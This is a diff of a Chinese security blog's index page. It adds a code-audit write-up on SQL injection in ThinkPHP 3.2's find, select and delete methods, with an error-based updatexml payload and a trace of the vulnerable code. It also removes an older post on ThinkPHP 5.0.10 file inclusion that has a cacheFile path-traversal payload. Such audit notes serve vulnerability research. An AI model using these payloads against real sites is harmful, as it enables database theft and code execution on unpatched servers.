@@ -236,6 +236,199 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/29/Thinkphp3.2 find_delete_selete注入分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/09/29/Thinkphp3.2 find_delete_selete注入分析/" itemprop="url">代码审计 | Thinkphp3.2 find_delete_selete注入分析</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-29T09:15:41+08:00">
+                2018-09-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<p>##<strong>基础知识:</strong><br><img src="http://static.zybuluo.com/chhyx/lw29luk5t7su3s5qqqriv3fn/image_1coi47sfp1u5q6iruc7rtffoe6k.png" alt="image_1coi47sfp1u5q6iruc7rtffoe6k.png-74kB"><br>更多基础知识看:<br><a href="https://p0rz9.github.io/2018/09/28/TP%E6%A1%86%E6%9E%B6%E6%95%B0%E6%8D%AE%E6%93%8D%E4%BD%9C/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/28/TP框架数据操作</a></p>
+<p>##<strong>环境搭建:</strong></p>
+<pre><code>#Application\Home\Controller\IndexController.class.php:
+&lt;?php
+namespace Home\Controller;
+use Think\Controller;
+class IndexController extends Controller {
+    public function index(){
+        $Model = M(&apos;user&apos;);
+        $Model-&gt;find(I(&apos;get.id&apos;));
+        //$Model-&gt;select(I(&apos;get.id&apos;));
+        //$Model-&gt;delete(I(&apos;get.id&apos;));
+    }
+}
+?&gt;
+</code></pre><p><code>select</code>、<code>delete</code>与<code>find</code>代码分析流程基本一样 这里就不再赘述 因为方法中都调用了有问题的<code>_parseOptions()</code>方法</p>
+<p>##<strong>漏洞利用：</strong><br>payload:</p>
+<pre><code>http://127.0.0.1:85/index.php/home/index/index?id[where]=id = 1 and updatexml(0,concat(0xa,user()),0)
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/vmaxbtyn92txy3ccoburcfmp/image_1coi3s5gvspqtpo1s1g1euq15e067.png" alt="image_1coi3s5gvspqtpo1s1g1euq15e067.png-81kB"></p>
+<p>##<strong>代码分析:</strong><br>相关变量已加到注释中<br>A.从<code>IndexController.class.php</code>开始分析</p>
+<pre><code>$Model-&gt;find(I(&apos;get.id&apos;));
+</code></pre><p>B.跟进<code>Thinkphp\Library\Think\Model.class.php</code>的<code>find()</code>方法:</p>
+<pre><code>#Thinkphp\Library\Think\Model.class.php 722行
+public function find($options=array()) {
+...
+// 总是查找一条记录
+$options[&apos;limit&apos;]   =   1;
+
+    // 分析表达式
+    $options            =   $this-&gt;_parseOptions($options);
+    //方法的核心 分析表达式 获取表名 获取字段
+
+    // 判断查询缓存
+    //无缓存
+...
+
+    $resultSet          =   $this-&gt;db-&gt;select($options);//在这里报错
+</code></pre><p>进入_parseOptions()方法:</p>
+<pre><code>protected function _parseOptions($options=array()) {
+if(is_array($options))
+    $options =  array_merge($this-&gt;options,$options);
+...
+// 表达式过滤
+$this-&gt;_options_filter($options);
+return $options;
+}
+</code></pre><p>进入<code>_parseOptions()</code>方法后,判断如果<code>$options</code>为数组 则直接拼接 下面的<code>_options_filter()</code>是个空方法 并无过滤<br>我们继续分析：</p>
+<pre><code>$resultSet       =   $this-&gt;db-&gt;select($options);
+</code></pre><p>C.跟进<code>Thinkphp\Library\Think\Db\Driver.class.php</code>文件的<code>select()</code>方法:<br><img src="http://static.zybuluo.com/chhyx/tdbbat7954ktp3f227xv32sr/image_1coi0lkg517g1ghqv331n9fj6o9.png" alt="image_1coi0lkg517g1ghqv331n9fj6o9.png-48.9kB"></p>
+<p>跟进生成<code>buildSelectSql()</code>方法:</p>
+<pre><code>public function buildSelectSql($options=array()) {
+...
+$sql  =   $this-&gt;parseSql($this-&gt;selectSql,$options);
+return $sql;
+}
+</code></pre><p>跟进<code>parseSql()</code>方法:<br><img src="http://static.zybuluo.com/chhyx/w5s7d3huryk02oimj6hn2cu6/image_1coi0q3fk1hh0jkiatc1oc515sm1m.png" alt="image_1coi0q3fk1hh0jkiatc1oc515sm1m.png-75.9kB"></p>
+<p>跟进<code>parseWhere()</code>方法:<br><img src="http://static.zybuluo.com/chhyx/px40iynyvtu30hk0kqywdv5n/image_1coi1gccr10g61jcvfk5stn6i35q.png" alt="image_1coi13nn815cb1fates71u48k9u30.png-28.6kB"></p>
+<p>传入的<code>$options[&#39;where&#39;]</code>的值为<code>string</code>类型时直接返回</p>
+<p>D.在<code>parseSql()</code>方法中 我们可以看到不仅仅<code>$where</code>我们可控 像其他的<code>table field order union</code>等 我们都是可以控制的:<br><img src="http://static.zybuluo.com/chhyx/px40iynyvtu30hk0kqywdv5n/image_1coi1gccr10g61jcvfk5stn6i35q.png" alt="image_1coi1gccr10g61jcvfk5stn6i35q.png-47.9kB"></p>
+<p>也就是说我们可以自己构造sql语句进行注入。</p>
+<p>E.经过分析,我们可得到造成漏洞的原因是<code>_parseOptions()</code>方法中直接拼接字符串导致的 我们搜一下这个方法的所有利用点:</p>
+<pre><code>_parseOptions($options)
+</code></pre><p>搜了下整个框架,引入这个<code>_parseOptions()</code>的方法情况:<br>第一个参数可控时,可注入:</p>
+<pre><code>public function find($options=array())
+public function select($options=array())
+public function delete($options=array())
+</code></pre><p>第二个参数可控时,可注入:</p>
+<pre><code>public function save($data=&apos;&apos;,$options=array())
+public function add($data=&apos;&apos;,$options=array(),$replace=false)
+public function addAll($dataList,$options=array(),$replace=false)
+</code></pre><p>//不将<code>$options</code>带入sql语句中,无法注入:</p>
+<pre><code>public function selectAdd($fields=&apos;&apos;,$table=&apos;&apos;,$options=array())
+</code></pre><p>一共可利用的点有6处。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/28/TP框架数据操作/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -971,7 +1164,7 @@ hex()   hex加密 防止数据库有特殊字符传不出来
         
           
             <blockquote>
-<p>跟着P师傅后面捡洞不容易,虽然撞洞了,但是毕竟是自己审出来的,还是分析记录下为好。</p>
+<p>跟着P师傅后面捡洞不容易,洞虽然撞了,但毕竟是自己审出来的,还是分析记录一波</p>
 </blockquote>
 <hr>
 <p>##<strong>1.基础知识:</strong><br>A.<code>Thinkphp</code>的一些基本操作<br><img src="http://static.zybuluo.com/chhyx/a3hij28f4rsix5nv4bwd7z5d/image_1co76cjk27kqo00i3auj21f3l3c.png" alt="image_2co63sh5e1locbbe1l3epu38hqm.png-91.1kB"><br>更多基础知识可参考文章：<br><a href="http://static.zybuluo.com/chhyx/a3hij28f4rsix5nv4bwd7z5d/image_1co76cjk27kqo00i3auj21f3l3c.png" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/15/ThinkPHP</a></p>
@@ -2260,289 +2453,6 @@ $this-&gt;PDOStatement = $this-&gt;linkID-&gt;prepare($sql);
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/17/ThinkPHP3.x5.x框架任意文件包含/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/09/17/ThinkPHP3.x5.x框架任意文件包含/" itemprop="url">代码审计 | ThinkPHP3.x/5.x框架任意文件包含</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-17T10:15:41+08:00">
-                2018-09-17
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-<p>最近学习thinkphp框架审计 网上找了几个例子去复现,看到关于这个漏洞的文章不是很多,所以在大佬的payload的基础上自己试着审计了一波,记录一下。</p>
-</blockquote>
-<hr>
-<p>审计cms：<a href="http://www.thinkphp.cn/down.html" target="_blank" rel="noopener">Thinkphp 5.0.10</a><br>漏洞原理:</p>
-<pre><code>ThinkPHP在加载模版解析变量时存在变量覆盖的问题，且没有对 $cacheFile 进行相应的消毒处理，导致模板文件的路径可以被覆盖，从而导致任意文件包含漏洞的发生。
-</code></pre><p>##<strong>1.基础知识:</strong><br>Thinkphp的一些基本操作<br><img src="http://static.zybuluo.com/chhyx/g7pjo7e4gk3hshv17d0equzb/image.png" alt="image.png-73.6kB"></p>
-<p>其他基础知识可参考文章:<br><a href="https://p0rz9.github.io/2018/09/15/ThinkPHP%E6%A1%86%E6%9E%B6%205.0.x%20sql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/15/ThinkPHP%E6%A1%86%E6%9E%B6%205.0.x%20sql%E6%B3%A8%E5%85%A5/</a></p>
-<p>##<strong>2.环境搭建:</strong><br>A.</p>
-<pre><code>#thinkphp5_0_10\application\index\controller\Index.php
-&lt;?php
-namespace app\index\controller;
-class Index extends \think\Controller 
-{
-    public function index()
-    {
-        $this-&gt;assign($this-&gt;request-&gt;post());
-        return $this-&gt;fetch();
-
-        }
-}
-</code></pre><p>B.在thinkphp5_0_10\application\index\view\index目录下新建一个index.html，内容随意填写</p>
-<p>C.因为测试漏洞为文件包含 所以在根目录新建一个1.txt当测试用(其他格式也可以 内容<code>&lt;?php phpinfo();?&gt;)</code></p>
-<p>##<strong>3.漏洞利用:</strong><br>payload:</p>
-<pre><code>post:cacheFile=../1.txt
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/068ucjph0k3tr314ximxszv2/image.png" alt="image.png-34kB"></p>
-<p>##<strong>4.代码分析:</strong><br><strong>其相关变量的值已加在注释中:</strong><br>A.从index.php开始分析:</p>
-<pre><code>$this-&gt;assign($this-&gt;request-&gt;post());
-</code></pre><p>进入thinkphp5_0_10\thinkphp\library\think\Controller.php</p>
-<p><img src="http://static.zybuluo.com/chhyx/d3vvbqzjlw3m0h33qojuykrj/image.png" alt="image.png-13.3kB"></p>
-<p>跟进<code>thinkphp5_0_10\thinkphp\library\think\View.php</code></p>
-<pre><code>#thinkphp5_0_10\thinkphp\library\think\View.php 92行
-public function assign($name, $value = &apos;&apos;)
-{      
-    if (is_array($name)) {//$name:[&quot;cacheFile&quot;]=&gt;&quot;../1.txt&quot;
-        //$this-&gt;data:空字符  把$name赋值给$this-&gt;data
-        $this-&gt;data = array_merge($this-&gt;data, $name);
-    } else {
-        $this-&gt;data[$name] = $value;
-    }
-    return $this;
-}
-</code></pre><p>传进去的变量<code>cacheFile</code>成功存储,我们打印下<code>$this</code>:<br><img src="http://static.zybuluo.com/chhyx/8f08wcjbsngdwizmbb7xudjj/image.png" alt="image.png-112.8kB"></p>
-<p>B.返回index.php继续分析:</p>
-<pre><code>return $this-&gt;fetch();
-</code></pre><p>跟进<code>thinkphp5_0_10\thinkphp\library\think\View.php</code><br><img src="http://static.zybuluo.com/chhyx/17x7tdldon5dbxedadlkq2vl/image.png" alt="image.png-13.8kB"></p>
-<p>跟进<code>thinkphp5_0_10\thinkphp\library\think\View.php</code></p>
-<pre><code>#thinkphp5_0_10\thinkphp\library\think\View.php   149行
-public function fetch($template = &apos;&apos;, $vars = [], $replace = [], $config = [], $renderContent = false)
-    {
-        // 模板变量
-        //self::$var:空  $vars:空
-        $vars = array_merge(self::$var, $this-&gt;data, $vars);
-
-        // 页面缓存
-        ob_start();
-        ob_implicit_flush(0);
-
-        // 渲染输出
-        $method = $renderContent ? &apos;display&apos; : &apos;fetch&apos;;//$renderContent=false所以$method=fetch
-        $this-&gt;engine-&gt;$method($template, $vars, $config);//$this-&gt;engine-&gt;$fetch
-
-        // 获取并清空缓存
-
-        $content = ob_get_clean();
-        // 内容过滤标签
-        Hook::listen(&apos;view_filter&apos;, $content);
-        // 允许用户自定义模板的字符串替换
-        $replace = array_merge($this-&gt;replace, $replace);
-        if (!empty($replace)) {
-            $content = strtr($content, $replace);
-        }
-
-        return $content;
-    }
-</code></pre><p>在上面的<code>$this-&gt;engine-&gt;$method($template, $vars, $config);</code> 这里的$method是fetch<br>跟进本文件的<code>engine()</code>方法:</p>
-<pre><code>#thinkphp5_0_10\thinkphp\library\think\View.php   109行
-public function engine($options = [])
- {   
-     if (is_string($options)) {
-         $type    = $options;
-         $options = [];
-     } else {
-         $type = !empty($options[&apos;type&apos;]) ? $options[&apos;type&apos;] : &apos;Think&apos;;//$type:Think
-     }
-     $class = false !== strpos($type, &apos;\\&apos;) ? $type : &apos;\\think\\view\\driver\\&apos; . ucfirst($type);
-     //$class:\think\view\driver\Think
-     if (isset($options[&apos;type&apos;])) {
-         unset($options[&apos;type&apos;]);
-     }
-     $this-&gt;engine = new $class($options);
-     return $this;
- }
-</code></pre><p>在上面的<code>$this-&gt;engine = new $class($options);</code>初始化了一个类 我们打印下这个类:<br><img src="http://static.zybuluo.com/chhyx/3m78ae1hfa152s73s73of0xc/image.png" alt="image.png-72.3kB"></p>
-<p>C.跟进<code>thinkphp\library\think\view\driver\Think.php</code> </p>
-<pre><code>#thinkphp5_0_10\thinkphp\library\think\view\driver\Think.php  72行:
-public function fetch($template, $data = [], $config = [])
-{   
-    if (&apos;&apos; == pathinfo($template, PATHINFO_EXTENSION)) {
-        // 获取模板文件名
-        $template = $this-&gt;parseTemplate($template);
-        //$template:application/index\view\index\index.html
-    }
-    // 模板不存在 抛出异常
-    if (!is_file($template)) {
-        throw new TemplateNotFoundException(&apos;template not exists:&apos; . $template, $template);
-    }
-    // 记录视图信息
-    App::$debug &amp;&amp; Log::record(&apos;[ VIEW ] &apos; . $template . &apos; [ &apos; . var_export(array_keys($data), true) . &apos; ]&apos;, &apos;info&apos;);
-    $this-&gt;template-&gt;fetch($template, $data, $config);
-}
-</code></pre><p>在上面的<code>$this-&gt;template-&gt;fetch($template, $data, $config);</code>,我们跟进<code>thinkphp\library\think\Template.php</code></p>
-<pre><code>#thinkphp5_0_10\thinkphp\library\think\Template.php  168行
-public function fetch($template, $vars = [], $config = [])
-    {   
-        //$template:application/index\view\index\index.html
-        //$vars:{ [&quot;cacheFile&quot;]=&gt; string(8) &quot;../1.txt&quot; } 
-        if ($vars) {
-            $this-&gt;data = $vars;
-        }
-        if ($config) {
-            $this-&gt;config($config);
-        }
-        ...
-        $template = $this-&gt;parseTemplateFile($template);
-        //$template:application/index\view\index\index.html
-        if ($template) {
-            $cacheFile = $this-&gt;config[&apos;cache_path&apos;] . $this-&gt;config[&apos;cache_prefix&apos;] . md5($template) . &apos;.&apos; . ltrim($this-&gt;config[&apos;cache_suffix&apos;], &apos;.&apos;);
-            //得到一个缓存文件
-            //&amp;cacheFile:runtime\temp\7e5953484e3b2cf427e4490795d079f3.php
-            ...
-            // 页面缓存
-            ob_start();
-            ob_implicit_flush(0);
-            // 读取编译存储
-            //$this-&gt;storage:object(think\template\driver\File)
-            $this-&gt;storage-&gt;read($cacheFile, $this-&gt;data);
-            // 获取并清空缓存
-            $content = ob_get_clean();
-            if (!empty($this-&gt;config[&apos;cache_id&apos;]) &amp;&amp; $this-&gt;config[&apos;display_cache&apos;]) {
-                // 缓存页面输出
-                Cache::set($this-&gt;config[&apos;cache_id&apos;], $content, $this-&gt;config[&apos;cache_time&apos;]);
-            }
-            echo $content;
-        }
-    }
-</code></pre><p>在上面的<code>$this-&gt;storage-&gt;read($cacheFile, $this-&gt;data);</code>我们打印下看看:<br><img src="http://static.zybuluo.com/chhyx/j7ho82m627t9qpqfrmcxcbao/image.png" alt="image.png-75.5kB"><br>D.跟进<code>thinkphp\library\think\template\driver\File.php</code></p>
-<pre><code>#thinkphp5_0_10\thinkphp\library\think\template\driver\File.php 43行
-public function read($cacheFile, $vars = [])
-    {   
-        //$vars:{ [&quot;cacheFile&quot;]=&gt; string(8) &quot;../1.txt&quot; }
-        //$cacheFile:thinkphp5_0_10\runtime\temp\7e5953484e3b2cf427e4490795d079f3.php
-        if (!empty($vars) &amp;&amp; is_array($vars)) {
-            // 模板阵列变量分解成为独立变量
-            extract($vars, EXTR_OVERWRITE);//如果有冲突,覆盖已有变量
-        }
-        //载入模版缓存文件
-        include $cacheFile;//包含php文件
-    }
-</code></pre><p>上面的<code>extract($vars, EXTR_OVERWRITE);</code>//EXTR_OVERWRITE为默认模式。如果有冲突,则覆盖已有变量。<br>最后成功包含文件。</p>
-<p>最后我们来理一下跟进的文件,方便各位小伙伴复现:</p>
-<pre><code>assign:index.php-&gt;Controller.php-&gt;View.php 
-fetch:index.php-&gt;Controller.php-&gt;View.php-&gt;Think.php-&gt;Template.php-&gt;File.php造成包含
-</code></pre><p>##<strong>5.参考链接:</strong><br><a href="https://www.kancloud.cn/manual/thinkphp5/118113" target="_blank" rel="noopener">https://www.kancloud.cn/manual/thinkphp5/118113</a><br><a href="https://mp.weixin.qq.com/s/IuKjTS0Q0VVzuoeSwqZ5Gw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/IuKjTS0Q0VVzuoeSwqZ5Gw</a><br><a href="https://mochazz.github.io/2018/04/30/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%7C%20ThinkPHP3.x%E3%80%815.x%E6%A1%86%E6%9E%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" target="_blank" rel="noopener">https://mochazz.github.io/2018/04/30/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%7C%20ThinkPHP3.x%E3%80%815.x%E6%A1%86%E6%9E%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2593,7 +2503,7 @@ fetch:index.php-&gt;Controller.php-&gt;View.php-&gt;Think.php-&gt;Template.php-&
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-count">20</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
